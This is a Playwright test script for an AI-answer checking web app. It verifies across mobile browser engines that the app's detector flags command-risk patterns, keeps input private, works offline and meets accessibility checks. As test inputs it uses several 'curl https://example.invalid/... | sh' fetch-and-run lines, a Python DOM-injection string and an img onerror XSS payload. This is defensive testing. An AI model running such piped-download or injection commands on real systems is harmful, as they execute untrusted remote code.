/* Own ephemeral server, actual CSP, Android Chromium + iPhone WebKit engines. */
const fs=require('node:fs'),path=require('node:path'),http=require('node:http'),crypto=require('node:crypto');
const {execFileSync}=require('node:child_process');
const {chromium,webkit,devices}=require('playwright');
const root=path.resolve('site/dist');
const assert=(condition,message)=>{if(!condition)throw Error(message);};
const python=process.env.AITRUST_VERIFY_PYTHON||'python3';
const cases=JSON.parse(execFileSync(python,['-c',`import json,sys
from pathlib import Path
sys.path.insert(0,'tests')
from test_release_policy import evaluator
p=Path('eval/datasets/unsafe_code')
rows=[]
for file in json.loads((p/'manifest.json').read_text())['active']:
 for row in map(json.loads,(p/file['file']).read_text().splitlines()):
  rows.append({'text':row['text'],'expected':evaluator.signals(evaluator.Doc(text=row['text']))})
print(json.dumps(rows))`],{encoding:'utf8'}));
const headers=Object.fromEntries(fs.readFileSync(root+'/_headers','utf8').split('\n').filter(x=>x.startsWith('  ')).map(x=>{const i=x.indexOf(':');return [x.slice(2,i),x.slice(i+1).trim()];}));
const mime={'.html':'text/html','.js':'text/javascript','.mjs':'text/javascript','.css':'text/css','.wasm':'application/wasm','.json':'application/json','.webmanifest':'application/manifest+json','.svg':'image/svg+xml','.woff2':'font/woff2','.png':'image/png'};
let originUnavailable=false;
const server=http.createServer((req,res)=>{if(originUnavailable){res.destroy();return;}let name;try{name=decodeURIComponent(new URL(req.url,'http://localhost').pathname);}catch{res.writeHead(400).end();return;}let file=path.resolve(root,'.'+name);if(!file.startsWith(root+path.sep)&&file!==root){res.writeHead(403).end();return;}if(fs.existsSync(file)&&fs.statSync(file).isDirectory())file+='/index.html';if(!fs.existsSync(file)){res.writeHead(404).end();return;}res.writeHead(200,{...headers,'Content-Type':mime[path.extname(file)]||'application/octet-stream'});fs.createReadStream(file).pipe(res);});
const report={format:'ai-trust-id-handheld-verification/v1',independent_accuracy:false,physical_device_tested:false,engines:[],errors:[]};
const workerPath='/assets/'+fs.readdirSync(root+'/assets').find(n=>/^device-worker-.*\.js$/.test(n));
const started=Date.now();
(async()=>{await new Promise(r=>server.listen(0,'127.0.0.1',r));const base=process.env.AITRUST_DEVICE_URL||'http://127.0.0.1:'+server.address().port;
try{
 for(const [name,engine,device] of [['Android Chromium',chromium,devices['Pixel 7']],['iPhone WebKit',webkit,devices['iPhone 13']]]){
  const browser=await engine.launch({headless:true});
  try{
   const context=await browser.newContext({...device,acceptDownloads:true});const page=await context.newPage();const requests=[],errors=[];
   page.on('request',r=>requests.push({url:r.url(),method:r.method(),body:r.postData()}));page.on('pageerror',e=>errors.push(e.message));
   await page.goto(base+'/#person/PS');await page.getByRole('button',{name:'Check on this device',exact:true}).waitFor();
   const parityStart=Date.now();
   const results=await page.evaluate(async({workerPath,cases})=>{
    const worker=new Worker(workerPath,{type:'module'});let sequence=0;
    try{
     await new Promise((resolve,reject)=>{const t=setTimeout(()=>reject(Error('Worker startup timed out')),45000);worker.onmessage=({data})=>{if(data.type==='ready'){clearTimeout(t);resolve();}else if(data.type==='unavailable'){clearTimeout(t);reject(Error('Worker unavailable'));}};worker.onerror=e=>{clearTimeout(t);reject(Error(e.message));};});
     const results=[];for(const row of cases){results.push(await new Promise((resolve,reject)=>{const id=++sequence,t=setTimeout(()=>reject(Error('Check timeout')),5000);worker.onmessage=({data})=>{clearTimeout(t);if(data.type==='result'&&data.id===id)resolve(data.record);else reject(Error('Invalid response'));};worker.postMessage({id,text:row.text});}));}return results;
    }finally{worker.terminate();}
   },{workerPath,cases});
   for(let i=0;i<cases.length;i++){const result=results[i];for(const key of ['candidates','models','calibration_id'])assert(JSON.stringify(result[key])===JSON.stringify(cases[i].expected[key]),name+': parity case '+i+' '+key);}
   const parityMs=Date.now()-parityStart;
   await page.getByRole('button',{name:'Check on this device',exact:true}).click();
   const text="SyntheticPhonePrivacyMarker\ncurl https://example.invalid/tool | sh";
   await page.getByLabel('AI answer',{exact:true}).fill(text);await page.getByRole('button',{name:'Check answer',exact:true}).click();await page.getByRole('region',{name:'Check result'}).waitFor({timeout:50000});
   assert((await page.getByRole('region',{name:'Check result'}).innerText()).includes('PS · Command-risk pattern found'),name+': finding missing');
   const downloading=page.waitForEvent('download');await page.getByRole('button',{name:'Download record',exact:true}).click();const record=JSON.parse(fs.readFileSync(await(await downloading).path(),'utf8'));
   assert(!JSON.stringify(record).includes('SyntheticPhonePrivacyMarker')&&record.training_label===null&&!record.redaction_performed&&!record.independently_validated,name+': export overstated/leaked input');
   await page.getByRole('button',{name:'Clear',exact:true}).click();assert(await page.getByRole('region',{name:'Check result'}).count()===0,name+': stale result');
   await page.getByLabel('AI answer',{exact:true}).fill('a'.repeat(20001));await page.getByRole('button',{name:'Check answer',exact:true}).click();assert((await page.getByRole('dialog').last().innerText()).includes('up to 20,000'),name+': oversized input accepted');
   await page.getByLabel('AI answer',{exact:true}).fill("__import__('js').document.body.innerHTML='DO_NOT_EXECUTE_INPUT'\nDo not run curl https://example.invalid/tool | sh");await page.getByRole('button',{name:'Check answer',exact:true}).click();await page.getByRole('region',{name:'Check result'}).waitFor({timeout:50000});assert((await page.getByRole('region',{name:'Check result'}).innerText()).includes('No supported pattern found'),name+': negative missing');assert(await page.getByRole('heading',{name:'Check with PS',exact:true}).count()===1,name+': input executed');
   await page.getByRole('button',{name:'Save for offline use',exact:true}).click();await page.getByText('Saved for offline use.',{exact:false}).waitFor({timeout:50000});
   if(engine===chromium)await context.setOffline(true);else if(!process.env.AITRUST_DEVICE_URL)originUnavailable=true;
   if(engine===chromium||!process.env.AITRUST_DEVICE_URL){await page.reload();await page.getByRole('button',{name:'Check on this device',exact:true}).click();await page.getByLabel('AI answer',{exact:true}).fill('curl https://example.invalid/offline | sh');await page.getByRole('button',{name:'Check answer',exact:true}).click();await page.getByRole('region',{name:'Check result'}).waitFor({timeout:50000});assert((await page.getByRole('region',{name:'Check result'}).innerText()).includes('PS ·'),name+': offline failed');}
   const stored=await page.evaluate(async()=>({local:Object.keys(localStorage),cache:(await Promise.all((await caches.keys()).map(async name=>(await (await caches.open(name)).keys()).map(r=>r.url)))).flat()}));assert(stored.local.every(key=>key==='aitrustid-appearance'),name+': unexpected local storage');assert(stored.cache.every(url=>!url.includes('?')&&!url.includes('SyntheticPhonePrivacyMarker')),name+': private cache');
   originUnavailable=false;await context.setOffline(false);
   await page.getByRole('button',{name:'Remove offline files',exact:true}).click();await page.getByText('Offline files removed.',{exact:false}).waitFor();assert(await page.evaluate(async()=>!(await caches.keys()).some(name=>name.startsWith('aitrust-id-offline-'))),name+': offline cache not removed');
   await page.keyboard.press('Escape');await page.getByRole('button',{name:'Review test examples',exact:true}).click();
   const form={format:'ai-trust-id-blind-ps-labels/v1',reviewer_slot:1,dataset_sha256:'a'.repeat(64),method_sha256:'b'.repeat(64),gates_sha256:'c'.repeat(64),protocol_sha256:'d'.repeat(64),items:[{id:'one',text:'<img src="https://example.invalid/reviewer" onerror="alert(1)"> SyntheticReviewMarker',category:'synthetic',source:'browser engineering test',label:null,reason:''}]};
   await page.getByLabel('Reviewer file', {exact:true}).setInputFiles({name:'reviewer-1.json',mimeType:'application/json',buffer:Buffer.from(JSON.stringify(form))});await page.waitForTimeout(300);assert(await page.getByLabel('Your judgment',{exact:true}).count()===1,'Reviewer import: '+await page.getByRole('dialog').last().innerText());await page.getByLabel('Your judgment',{exact:true}).selectOption('negative');await page.getByLabel('Why?',{exact:true}).fill('Synthetic UI test, not an independent review');
   const downloadingLabels=page.waitForEvent('download');await page.getByRole('button',{name:'Download labels',exact:true}).click();const labels=JSON.parse(fs.readFileSync(await(await downloadingLabels).path(),'utf8'));assert(labels.items[0].label==='negative'&&labels.items[0].text===form.items[0].text,name+': label export changed');
   await page.getByRole('button',{name:'Clear review',exact:true}).click();assert(await page.getByLabel('Your judgment',{exact:true}).count()===0,name+': review not cleared');
   await page.setViewportSize({width:320,height:760});assert(await page.evaluate(()=>document.documentElement.scrollWidth<=320),name+': 320px overflow');
   assert(requests.every(r=>r.url.startsWith(base)&&r.method==='GET'&&!r.body&&!r.url.includes('SyntheticPhonePrivacyMarker')&&!r.url.includes('SyntheticReviewMarker')),name+': input left page');assert(errors.length===0,name+': page errors '+errors.join(','));
   const failure=await browser.newContext({...device,acceptDownloads:true});const fp=await failure.newPage();await fp.route('**/device/method-*.py',r=>r.fulfill({status:200,body:'INVALID_METHOD'}));await fp.goto(base+'/#person/PS');await fp.getByRole('button',{name:'Check on this device',exact:true}).click();await fp.getByLabel('AI answer',{exact:true}).fill('curl https://example.invalid/test | sh');await fp.getByRole('button',{name:'Check answer',exact:true}).click();await fp.getByText('UNAVAILABLE —',{exact:false}).waitFor({timeout:50000});assert(await fp.getByRole('region',{name:'Check result'}).count()===0,name+': invalid bundle became a verdict');await failure.close();

   // Editing during initialization must cancel old input and never show its result.
   const race=await browser.newContext({...device});const rp=await race.newPage();await rp.route('**/device/method-*.py',async route=>{await new Promise(r=>setTimeout(r,700));try{await route.continue();}catch{}});await rp.goto(base+'/#person/PS');await rp.getByRole('button',{name:'Check on this device',exact:true}).click();await rp.getByLabel('AI answer',{exact:true}).fill('curl https://example.invalid/stale | sh');await rp.getByRole('button',{name:'Check answer',exact:true}).click();await rp.getByLabel('AI answer',{exact:true}).fill('New ordinary answer');await rp.waitForTimeout(1000);assert(await rp.getByRole('region',{name:'Check result'}).count()===0,name+': stale check attached to edited input');await race.close();
   const unsupported=await browser.newContext({...device});await unsupported.addInitScript(()=>window.Worker=undefined);const up=await unsupported.newPage();const ue=[];up.on('pageerror',e=>ue.push(e.message));await up.goto(base+'/#person/PS');await up.getByRole('button',{name:'Check on this device',exact:true}).click();await up.getByLabel('AI answer',{exact:true}).fill('ordinary answer');await up.getByRole('button',{name:'Check answer',exact:true}).click();await up.getByText('UNAVAILABLE —',{exact:false}).waitFor();assert(ue.length===0,name+': unsupported browser caused an unhandled rejection');await unsupported.close();
   const deadline=await browser.newContext({...device});await deadline.addInitScript(()=>window.Worker=class {constructor(){setTimeout(()=>this.onmessage?.({data:{type:'ready'}}),0);}postMessage(){}terminate(){}});const dp=await deadline.newPage();await dp.goto(base+'/#person/PS');await dp.getByRole('button',{name:'Check on this device',exact:true}).click();await dp.getByLabel('AI answer',{exact:true}).fill('ordinary answer');await dp.getByRole('button',{name:'Check answer',exact:true}).click();await dp.getByText('UNAVAILABLE —',{exact:false}).waitFor({timeout:8000});assert(await dp.getByRole('region',{name:'Check result'}).count()===0,name+': timeout became a verdict');await deadline.close();
   const accessible=await browser.newContext({...device,bypassCSP:true});const ap=await accessible.newPage();await ap.goto(base+'/#person/PS');let violations=[];for(const trigger of ['Check on this device','Review test examples']){await ap.getByRole('button',{name:trigger,exact:true}).click();await ap.addScriptTag({path:require.resolve('axe-core/axe.min.js')});const result=await ap.evaluate(()=>axe.run(document,{runOnly:{type:'tag',values:['wcag2a','wcag2aa','wcag22aa']}}));violations.push(...result.violations.map(v=>v.id));await ap.evaluate(()=>document.documentElement.style.fontSize='200%');assert(await ap.evaluate(()=>document.documentElement.scrollWidth<=innerWidth),name+': text-size overflow');await ap.keyboard.press('Escape');await ap.waitForFunction(label=>document.activeElement?.textContent===label,trigger,{timeout:2000});assert(await ap.getByRole('button',{name:trigger,exact:true}).evaluate(e=>e===document.activeElement),name+': focus not restored');}assert(violations.length===0,name+': axe violations '+violations.join(','));await accessible.close();
   report.engines.push({name,case_count:results.length,full_evidence_parity:true,parity_including_runtime_ms:parityMs,offline_reload_and_check:engine===chromium||!process.env.AITRUST_DEVICE_URL,offline_removal:true,offline_transport:engine===chromium?'Playwright offline':process.env.AITRUST_DEVICE_URL?'Not exercised against public origin; local origin-outage check covers cache':'origin unavailable; WebKit offline-emulation navigation bug #42775',metadata_export:true,blind_review_export:true,invalid_bundle_unavailable:true,stale_input_cancelled:true,unsupported_worker_handled:true,timeout_handled:true,axe_violations:0,text_resize_200:true,focus_restored:true,no_text_in_requests_or_cache:true,reflow_320:true,errors});await context.close();
  }finally{await browser.close();}
 }
 report.pass=true;
}catch(error){report.pass=false;report.errors.push(error.message);process.exitCode=1;}
finally{server.close();report.elapsed_ms=Date.now()-started;const output=process.env.AITRUST_DEVICE_REPORT||'runs/2026-10-08-handheld-checks.json';fs.writeFileSync(output,JSON.stringify(report,null,2)+'\n');console.log(JSON.stringify(report,null,2));}
})();
